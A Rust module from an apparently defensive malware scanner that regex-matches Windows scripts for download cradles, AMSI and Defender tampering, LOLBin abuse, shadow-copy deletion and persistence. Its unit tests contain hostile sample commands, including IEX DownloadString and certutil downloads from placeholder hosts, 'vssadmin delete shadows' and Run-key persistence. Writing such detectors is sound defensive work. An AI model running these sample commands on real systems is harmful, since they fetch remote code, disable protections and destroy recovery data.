//! Script file inspection: PowerShell, VBScript, JScript, HTML Applications
//! and batch files. The text is matched against high-signal behaviors
//! (download and execute, encoded commands, defense tampering, LOLBin abuse,
//! shadow-copy deletion, persistence) without being run. Obfuscated scripts
//! are also deobfuscated by content analysis in reports.

use std::sync::OnceLock;

use regex::Regex;

use super::document::DocumentReport;

/// Text scanned per script; longer files are cut and noted.
const MAX_SCRIPT_BYTES: usize = 4 * 1024 * 1024;
const SNIPPET_CHARS: usize = 120;

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub(super) enum Language {
    PowerShell,
    VbScript,
    JScript,
    Hta,
    Batch,
}

impl Language {
    fn name(self) -> &'static str {
        match self {
            Self::PowerShell => "PowerShell script",
            Self::VbScript => "VBScript",
            Self::JScript => "JScript",
            Self::Hta => "HTML Application (HTA)",
            Self::Batch => "batch file",
        }
    }
}

/// Language from the file extension; content alone is too ambiguous.
pub(super) fn language(path: &str) -> Option<Language> {
    let extension = path.rsplit_once('.')?.1.to_ascii_lowercase();
    Some(match extension.as_str() {
        "ps1" | "psm1" | "psd1" => Language::PowerShell,
        "vbs" | "vbe" | "wsf" => Language::VbScript,
        "js" | "jse" => Language::JScript,
        "hta" => Language::Hta,
        "bat" | "cmd" => Language::Batch,
        _ => return None,
    })
}

/// Script text: UTF-8 (with or without BOM) or UTF-16LE with BOM.
fn text(bytes: &[u8]) -> Option<String> {
    let bytes = &bytes[..bytes.len().min(MAX_SCRIPT_BYTES)];
    if let Some(wide) = bytes.strip_prefix(&[0xFF, 0xFE]) {
        let units: Vec<u16> = wide
            .as_chunks::<2>()
            .0
            .iter()
            .map(|pair| u16::from_le_bytes(*pair))
            .collect();
        return Some(String::from_utf16_lossy(&units));
    }
    let bytes = bytes.strip_prefix(&[0xEF, 0xBB, 0xBF]).unwrap_or(bytes);
    // Lossy decoding keeps scripts with a few stray bytes readable.
    let decoded = String::from_utf8_lossy(bytes);
    let replaced = decoded.matches('\u{FFFD}').count();
    (replaced * 20 <= decoded.len().max(1)).then(|| decoded.into_owned())
}

/// A behavior: a description and the pattern that reveals it.
struct Behavior {
    description: &'static str,
    pattern: &'static str,
    languages: &'static [Language],
    /// Common in legitimate scripts too: counted, but reported as a finding
    /// only next to a high-signal behavior.
    context_only: bool,
}

const ALL: &[Language] = &[
    Language::PowerShell,
    Language::VbScript,
    Language::JScript,
    Language::Hta,
    Language::Batch,
];
const WSH: &[Language] = &[Language::VbScript, Language::JScript, Language::Hta];

const BEHAVIORS: &[Behavior] = &[
    Behavior {
        description: "runs an encoded PowerShell command",
        pattern: r"(?i)powershell(?:\.exe)?\b[^\r\n]{0,200}\s-e(?:nc(?:odedcommand)?)?\s+[A-Za-z0-9+/=]{20,}",
        languages: ALL,
        context_only: false,
    },
    Behavior {
        description: "downloads content and executes it in memory",
        pattern: r"(?i)(?:iex|invoke-expression)\b[^\r\n]{0,200}(?:downloadstring|downloaddata|invoke-webrequest|\biwr\b|invoke-restmethod|\birm\b)|(?:downloadstring|downloaddata)\([^\r\n]{0,200}\)\s*\|\s*(?:iex|invoke-expression)",
        languages: &[Language::PowerShell, Language::Batch],
        context_only: false,
    },
    Behavior {
        description: "tampers with AMSI to blind antimalware scanning",
        pattern: r"(?i)amsiutils|amsiinitfailed|amsiscanbuffer|amsicontext",
        languages: ALL,
        context_only: false,
    },
    Behavior {
        description: "weakens Microsoft Defender (exclusions or disabled monitoring)",
        pattern: r"(?i)(?:add|set)-mppreference\b[^\r\n]{0,200}-(?:exclusion\w*|disable\w+)",
        languages: &[Language::PowerShell, Language::Batch],
        context_only: false,
    },
    Behavior {
        description: "loads a .NET assembly from memory",
        pattern: r"(?i)reflection\.assembly\]\s*::\s*load\s*\(",
        languages: &[Language::PowerShell],
        context_only: false,
    },
    Behavior {
        description: "calls native memory APIs, typical of shellcode loaders",
        pattern: r"(?i)\b(?:virtualalloc(?:ex)?|createthread|createremotethread|writeprocessmemory|rtlmovememory)\b",
        languages: &[Language::PowerShell],
        context_only: false,
    },
    Behavior {
        description: "downloads a file over HTTP and writes it to disk",
        pattern: r#"(?is)(?:msxml2\.xmlhttp|microsoft\.xmlhttp|winhttp\.winhttprequest|msxml2\.serverxmlhttp).{0,2000}adodb\.stream"#,
        languages: WSH,
        context_only: false,
    },
    Behavior {
        description: "runs commands through WScript.Shell or Shell.Application",
        pattern: r#"(?i)(?:wscript\.shell|shell\.application)"#,
        languages: WSH,
        context_only: true,
    },
    Behavior {
        description: "evaluates generated code at run time",
        pattern: r"(?i)\b(?:executeglobal|execute)\s*\(|\beval\s*\(",
        languages: WSH,
        context_only: true,
    },
    Behavior {
        description: "abuses a signed Windows binary to fetch or run payloads (LOLBin)",
        pattern: r"(?i)\b(?:certutil(?:\.exe)?\b[^\r\n]{0,120}-(?:urlcache|decode|decodehex)|bitsadmin(?:\.exe)?\b[^\r\n]{0,120}/transfer|mshta(?:\.exe)?\s+(?:https?:|vbscript:|javascript:)|regsvr32(?:\.exe)?\b[^\r\n]{0,120}/i:https?:|rundll32(?:\.exe)?\b[^\r\n]{0,120}javascript:)",
        languages: ALL,
        context_only: false,
    },
    Behavior {
        description: "deletes shadow copies or disables recovery (ransomware behavior)",
        pattern: r"(?i)vssadmin(?:\.exe)?\s+delete\s+shadows|wmic(?:\.exe)?\s+shadowcopy\s+delete|bcdedit(?:\.exe)?\b[^\r\n]{0,80}recoveryenabled\s+no|wbadmin(?:\.exe)?\s+delete\s+catalog",
        languages: ALL,
        context_only: false,
    },
    Behavior {
        description: "adds a Run key for persistence",
        pattern: r"(?i)\\currentversion\\run(?:once)?\b",
        languages: ALL,
        context_only: false,
    },
    Behavior {
        description: "creates a scheduled task",
        pattern: r"(?i)schtasks(?:\.exe)?\s+/create|register-scheduledtask|new-scheduledtaskaction",
        languages: ALL,
        context_only: false,
    },
    Behavior {
        description: "starts PowerShell hidden or with the execution policy bypassed",
        pattern: r"(?i)powershell(?:\.exe)?\b[^\r\n]{0,200}(?:-w(?:indowstyle)?\s+hidden|-ep\s+bypass|-executionpolicy\s+bypass)",
        languages: &[
            Language::Batch,
            Language::VbScript,
            Language::JScript,
            Language::Hta,
        ],
        context_only: false,
    },
];

fn compiled() -> &'static [Regex] {
    static COMPILED: OnceLock<Vec<Regex>> = OnceLock::new();
    COMPILED.get_or_init(|| {
        BEHAVIORS
            .iter()
            .map(|behavior| Regex::new(behavior.pattern).expect("valid script pattern"))
            .collect()
    })
}

fn snippet(text: &str, start: usize) -> String {
    let line_start = text[..start].rfind('\n').map_or(0, |index| index + 1);
    let line: String = text[line_start..]
        .lines()
        .next()
        .unwrap_or_default()
        .trim()
        .chars()
        .take(SNIPPET_CHARS)
        .collect();
    line
}

pub(super) fn inspect(bytes: &[u8], language: Language) -> Option<DocumentReport> {
    let text = text(bytes)?;
    let mut report = DocumentReport::new(language.name());
    report.macros_present = None;
    report.property("lines", text.lines().count().to_string());
    if bytes.len() > MAX_SCRIPT_BYTES {
        report.notes.push(format!(
            "only the first {} MiB of the script were scanned",
            MAX_SCRIPT_BYTES / (1024 * 1024)
        ));
    }
    let mut context = Vec::new();
    let mut high_signal = false;
    for (behavior, pattern) in BEHAVIORS.iter().zip(compiled()) {
        if !behavior.languages.contains(&language) {
            continue;
        }
        let mut matches = pattern
            .find_iter(&text)
            .filter(|found| !behavior.context_only || !is_definition(&text, found.start()));
        let Some(first) = matches.next() else {
            continue;
        };
        let count = 1 + matches.count();
        report.property(behavior.description, count.to_string());
        let finding = format!(
            "{} {}: {}",
            language.name(),
            behavior.description,
            snippet(&text, first.start())
        );
        if behavior.context_only {
            context.push(finding);
        } else {
            high_signal = true;
            report.suspicious_properties.push(finding);
        }
    }
    if high_signal {
        report.suspicious_properties.extend(context);
    }
    Some(report)
}

/// True when the match is a declaration or member name rather than a call,
/// such as `Function Execute(` or `obj.eval(`.
fn is_definition(text: &str, start: usize) -> bool {
    let line_start = text[..start].rfind('\n').map_or(0, |index| index + 1);
    let before = text[line_start..start].trim_end().to_ascii_lowercase();
    before.ends_with("function")
        || before.ends_with("sub")
        || before.ends_with('.')
        || before.ends_with("def")
}

#[cfg(test)]
mod tests {
    use super::{Language, inspect, language};

    fn findings(script: &str, language: Language) -> String {
        inspect(script.as_bytes(), language)
            .expect("script")
            .suspicious_properties
            .join("\n")
    }

    #[test]
    fn languages_come_from_extensions() {
        assert_eq!(language("C:/x/run.PS1"), Some(Language::PowerShell));
        assert_eq!(language("a.vbs"), Some(Language::VbScript));
        assert_eq!(language("a.hta"), Some(Language::Hta));
        assert_eq!(language("a.cmd"), Some(Language::Batch));
        assert_eq!(language("a.txt"), None);
        assert_eq!(language("noextension"), None);
    }

    #[test]
    fn powershell_cradles_and_defense_tampering() {
        let text = findings(
            "$s='http://x.example.test/a';IEX (New-Object Net.WebClient).DownloadString($s)\n\
             [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n\
             Add-MpPreference -ExclusionPath C:\\Users\n\
             [System.Reflection.Assembly]::Load($bytes)\n",
            Language::PowerShell,
        );
        assert!(
            text.contains("downloads content and executes it in memory"),
            "{text}"
        );
        assert!(text.contains("tampers with AMSI"), "{text}");
        assert!(text.contains("weakens Microsoft Defender"), "{text}");
        assert!(text.contains("loads a .NET assembly from memory"), "{text}");
    }

    #[test]
    fn vbscript_downloader_and_shell() {
        let text = findings(
            "Set h = CreateObject(\"MSXML2.XMLHTTP\")\nh.Open \"GET\", u, False\n\
             Set s = CreateObject(\"ADODB.Stream\")\nCreateObject(\"WScript.Shell\").Run \"cmd /c a.exe\"\n",
            Language::VbScript,
        );
        assert!(
            text.contains("downloads a file over HTTP and writes it to disk"),
            "{text}"
        );
        assert!(text.contains("WScript.Shell"), "{text}");
    }

    #[test]
    fn batch_ransomware_lolbins_and_persistence() {
        let text = findings(
            "@echo off\r\nvssadmin delete shadows /all /quiet\r\n\
             certutil -urlcache -split -f http://x.example.test/p.exe p.exe\r\n\
             reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d p.exe\r\n\
             schtasks /create /tn x /tr p.exe /sc onlogon\r\n\
             powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\r\n",
            Language::Batch,
        );
        for expected in [
            "deletes shadow copies",
            "LOLBin",
            "Run key",
            "scheduled task",
            "encoded PowerShell command",
            "hidden",
        ] {
            assert!(text.contains(expected), "missing {expected}: {text}");
        }
        assert!(
            text.contains("vssadmin delete shadows /all /quiet"),
            "{text}"
        );
    }

    #[test]
    fn common_constructs_alone_are_counted_not_reported() {
        let report = inspect(
            b"Function Execute(x)\nEnd Function\nGetResource = Eval(name)\nSet sh = CreateObject(\"WScript.Shell\")\n",
            Language::VbScript,
        )
        .expect("script");
        assert!(
            report.suspicious_properties.is_empty(),
            "{:?}",
            report.suspicious_properties
        );
        assert!(
            report
                .properties
                .iter()
                .any(|property| property.name.contains("WScript.Shell"))
        );
        // Next to a downloader, the same constructs are reported.
        let text = findings(
            "Set h = CreateObject(\"MSXML2.XMLHTTP\")\nSet s = CreateObject(\"ADODB.Stream\")\nCreateObject(\"WScript.Shell\").Run p\n",
            Language::VbScript,
        );
        assert!(text.contains("WScript.Shell"), "{text}");
        assert!(
            !findings(
                "[Reflection.Assembly]::LoadWithPartialName('x')",
                Language::PowerShell
            )
            .contains("from memory")
        );
    }

    #[test]
    fn an_ordinary_admin_script_has_no_findings() {
        let text = findings(
            "param([string]$Path)\nGet-ChildItem $Path | Where-Object Length -gt 1MB | Sort-Object Length\n\
             Write-Host 'done'\n",
            Language::PowerShell,
        );
        assert!(text.is_empty(), "{text}");
    }

    #[test]
    fn utf16_scripts_are_read_and_binary_data_is_rejected() {
        let mut wide = vec![0xFF, 0xFE];
        wide.extend(
            "vssadmin delete shadows /all"
                .encode_utf16()
                .flat_map(u16::to_le_bytes),
        );
        let report = inspect(&wide, Language::Batch).expect("script");
        assert_eq!(report.suspicious_properties.len(), 1);
        let binary: Vec<u8> = (0..=255u8).cycle().take(4096).collect();
        assert!(inspect(&binary, Language::Batch).is_none());
    }
}
